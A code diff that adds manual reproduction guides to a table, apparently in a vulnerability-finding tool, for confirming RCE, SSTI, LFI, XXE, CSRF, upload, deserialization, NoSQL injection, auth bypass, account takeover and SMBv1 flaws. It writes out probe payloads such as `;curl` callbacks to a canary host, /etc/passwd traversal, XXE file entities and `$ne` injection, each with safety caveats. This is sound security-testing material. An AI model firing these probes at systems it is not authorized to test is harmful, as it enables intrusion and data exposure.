@@ -323,6 +323,143 @@ const REPRO: Record<string, Omit<ManualRepro, "classId">> = {
     confirmsIf: "The endpoint really serves sensitive internal content to an unauthenticated request.",
     safe: "Read only what proves it; don't hoard dumps.",
   },
+  rce: {
+    title: "Confirm remote code execution / command injection",
+    tools: "Browser or Repeater + DevTools → Network (and an OAST canary)",
+    steps: [
+      "Identify the input that reaches a shell/eval (a parameter, header, filename, or field). Send a normal request and note the baseline response body + timing in DevTools → Network.",
+      "TIME probe (non-destructive): append a delay for the likely OS — e.g. `;sleep 5`, `|sleep 5`, `$(sleep 5)`, or backticks `` `sleep 5` `` (URL-encode). Re-send and compare the request duration to baseline.",
+      "OUT-OF-BAND probe (most reliable, needs no output): make it call a canary you control — `;nslookup <id>.oast.site` or `;curl http://<id>.oast.site` — and watch interactsh / Burp Collaborator / webhook.site for a hit FROM the target's IP.",
+      "If output is reflected, run a harmless read-only command (`id`, `whoami`, `hostname`) and confirm its output appears in the response.",
+    ],
+    confirmsIf: "A `sleep` payload delays the response by ~5s, your OAST canary logs a lookup/HTTP hit from the server, or the output of `id`/`whoami` shows up in the response.",
+    safe: "Read-only proof ONLY — sleep, DNS/HTTP callback, or id/whoami. Never read/modify files, add users, spawn a shell, or run anything destructive.",
+  },
+  ssti: {
+    title: "Confirm server-side template injection (SSTI)",
+    tools: "Browser or Repeater + DevTools → Network",
+    steps: [
+      "Find an input reflected into a server-rendered template (display name, subject line, profile field, custom error).",
+      "Send a math probe for common engines: `{{7*7}}` (Jinja2/Twig), `${7*7}` (Freemarker/JSP-EL), `#{7*7}`, or `<%= 7*7 %>` (ERB). URL-encode as needed.",
+      "Check the response: if it prints `49` instead of the literal `{{7*7}}`, the template evaluated your expression.",
+      "Fingerprint the engine to be sure — e.g. `{{7*'7'}}` yields `7777777` in Jinja2 but `49` in Twig. That's enough proof.",
+    ],
+    confirmsIf: "The response shows the evaluated result (e.g. `49` / `7777777`) rather than the literal expression — the engine executed your input.",
+    safe: "Arithmetic/identity probes only. Do NOT escalate SSTI to RCE gadgets on a target you don't own.",
+  },
+  lfi: {
+    title: "Confirm local file inclusion / path traversal",
+    tools: "Browser + DevTools → Network",
+    steps: [
+      "Find the parameter that names a file or path (`?page=`, `?file=`, `?template=`, `?lang=`).",
+      "Request a known-safe, always-present file via traversal: `../../../../etc/passwd` (Linux) or `..\\..\\..\\windows\\win.ini` (Windows). If filtered, try `%2e%2e%2f`, double-encoding, or a null/extension trick.",
+      "Read the response in DevTools → Network for the file's signature — `root:x:0:0:` for /etc/passwd, `[fonts]` for win.ini.",
+      "For PHP, a read-only wrapper like `php://filter/convert.base64-encode/resource=index` returns base64 you can decode to confirm source disclosure.",
+    ],
+    confirmsIf: "The response returns the contents of a local file you didn't upload (e.g. /etc/passwd lines) — proving arbitrary file read.",
+    safe: "Read one innocuous system file to prove reach. Don't pull secrets/keys or chain to RCE (log poisoning, wrapper-to-exec).",
+  },
+  xxe: {
+    title: "Confirm XML external entity (XXE)",
+    tools: "Repeater / DevTools → Network (and an OAST canary)",
+    steps: [
+      "Find an endpoint that parses XML (SOAP, SAML, sitemap/import, `Content-Type: application/xml`). Capture a normal request.",
+      "Add a DOCTYPE with an external entity and reference it in a field the response echoes: `<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/hostname\">]>` then use `&x;` in the body.",
+      "If reflected, check the response for the file's content. If blind, point the entity at your canary (`SYSTEM \"http://<id>.oast.site\"`) and watch for the inbound hit.",
+    ],
+    confirmsIf: "The parsed response reflects local file content, or your OAST canary receives a request from the server — the parser resolved your external entity.",
+    safe: "Read a harmless file (/etc/hostname) or just OOB-ping your canary. Don't port-scan internal hosts or chain to SSRF.",
+  },
+  csrf: {
+    title: "Confirm cross-site request forgery (CSRF)",
+    tools: "Browser + a small off-origin test page",
+    steps: [
+      "Capture a state-changing request (e.g. change email) in DevTools → Network. Confirm it relies only on cookies — no unpredictable CSRF token and no SameSite protection.",
+      "Build a minimal auto-submitting HTML form that reproduces that exact request, served from a different origin (a local .html file works).",
+      "While logged into the target in the same browser, open your test page and let it submit.",
+      "Refresh the target and check whether the state changed (e.g. the email updated) driven purely by the cross-site request.",
+    ],
+    confirmsIf: "The action succeeds from your off-site page using the victim's ambient session, with no anti-CSRF token required.",
+    safe: "Change one low-risk setting on YOUR OWN test account and revert it. Never target other users.",
+  },
+  file_upload: {
+    title: "Confirm unrestricted / dangerous file upload",
+    tools: "Browser upload form + DevTools → Network",
+    steps: [
+      "Upload a benign allowed file first and find where it's served (note the returned URL/path).",
+      "Upload a harmless file with a dangerous extension or content-type — e.g. a `.php` containing `<?php echo 'RD','PROOF'; ?>`, or a `.svg` with `<svg onload=alert(document.domain)>`.",
+      "Fetch the uploaded file's URL and watch whether the server EXECUTES/renders it (PHP output, SVG script runs) instead of serving it inert.",
+    ],
+    confirmsIf: "The uploaded file is stored AND executed/rendered — proving code execution or stored XSS via upload, not just a file being accepted.",
+    safe: "Benign marker payloads only; delete the test file afterward.",
+  },
+  deserialization: {
+    title: "Confirm insecure deserialization",
+    tools: "Repeater + OAST canary",
+    steps: [
+      "Identify serialized input — a base64 Java blob (starts `rO0`), a PHP `O:` string, a .NET blob (`AAEAAAD`), a viewstate/cookie/token.",
+      "Confirm the format/framework from the prefix and where it's accepted.",
+      "Non-destructive proof: send a well-known DETECTION gadget that only triggers an out-of-band DNS/HTTP callback (e.g. a URLDNS-style payload) — no command execution.",
+      "Submit it and watch your canary for a request from the server.",
+    ],
+    confirmsIf: "Your OOB canary logs a callback from the target after you send the crafted object — the server deserialized attacker-controlled data.",
+    safe: "Detection gadget (DNS/HTTP callback) ONLY. Do not run command/RCE gadget chains on systems you don't own.",
+  },
+  nosqli: {
+    title: "Confirm NoSQL injection",
+    tools: "Browser or Repeater + DevTools → Network",
+    steps: [
+      "Find a JSON or query parameter used in auth or lookups. Capture a baseline request/response.",
+      "Send an operator-injection payload — JSON: `{\"username\":\"admin\",\"password\":{\"$ne\":null}}`; query-string: `username=admin&password[$ne]=` or `password[$gt]=`.",
+      "Compare against the normal request in DevTools → Network — auth success, extra rows, or a changed result.",
+    ],
+    confirmsIf: "An operator payload (`$ne`, `$gt`, `$regex`) changes the outcome — e.g. logs in without a valid password or returns records it shouldn't.",
+    safe: "Boolean operator tests on your own test account. No bulk data extraction.",
+  },
+  auth_bypass: {
+    title: "Confirm authentication / authorization bypass",
+    tools: "Browser + DevTools → Network",
+    steps: [
+      "Identify the protected resource and how access is enforced (login redirect, 401/403, a role flag/cookie/JWT claim).",
+      "Try one bypass at a time, watching the response: request the resource directly with no auth; force-browse past the redirect; tamper a role cookie or JWT claim (`admin:false`→`true`); replay a privileged endpoint with a low-privilege session.",
+      "Confirm whether protected content or actions become reachable.",
+    ],
+    confirmsIf: "You reach a protected page or perform a privileged action without proper authentication/authorization.",
+    safe: "Use your own accounts; observe rather than damage, and report instead of pivoting.",
+  },
+  ato: {
+    title: "Confirm account takeover (ATO)",
+    tools: "Browser + DevTools → Network + two of your own test accounts",
+    steps: [
+      "Map the recovery / email-change / session flow in DevTools → Network.",
+      "Test the specific weakness the finding names — reset token not bound to the user, OTP with no rate limit, token leaked in the response, or host-header poisoning of the reset link.",
+      "Using account A as the 'attacker' against account B (both YOURS), attempt to take over B through that weakness.",
+    ],
+    confirmsIf: "You gain access to test account B from account A via the flaw — a reproducible takeover primitive.",
+    safe: "Both accounts must be yours. Prove the primitive, then stop — never target real users.",
+  },
+  outdated: {
+    title: "Confirm the vulnerable/outdated component",
+    tools: "Browser + curl / searchsploit / a safe check script",
+    steps: [
+      "Confirm the exact product + version from more than one signal (DevTools → Network response headers, a `/version` endpoint, page fingerprints) — banners can lie after back-patching.",
+      "Map that version to the specific CVE(s) the finding cites and verify it's actually in the vulnerable range.",
+      "Run only the NON-destructive check for that CVE — a version-based nuclei template, `nmap --script`, or an `msf check` — to confirm this instance is genuinely affected.",
+    ],
+    confirmsIf: "The running version is confirmed in the vulnerable range AND a safe check reports the target affected — not merely a banner match.",
+    safe: "Version + safe 'check' only. Don't fire the weaponized exploit unless you're explicitly authorized.",
+  },
+  legacy_smb: {
+    title: "Confirm legacy SMB (SMBv1 / MS17-010 family)",
+    tools: "nmap from your authorized machine",
+    steps: [
+      "Confirm the dialect: `nmap -p445 --script smb-protocols <host>` — check whether SMBv1 is offered.",
+      "Run the SAFE vuln check (no exploitation): `nmap -p445 --script smb-vuln-ms17-010 <host>`.",
+      "Read the script output for a VULNERABLE / NOT VULNERABLE verdict.",
+    ],
+    confirmsIf: "nmap reports SMBv1 enabled and/or the ms17-010 (or relevant) script marks the host VULNERABLE.",
+    safe: "NSE safe-check scripts only — never fire the EternalBlue exploit on a system you don't own.",
+  },
 };
 
 const REPRO_FALLBACK: Omit<ManualRepro, "classId"> = {
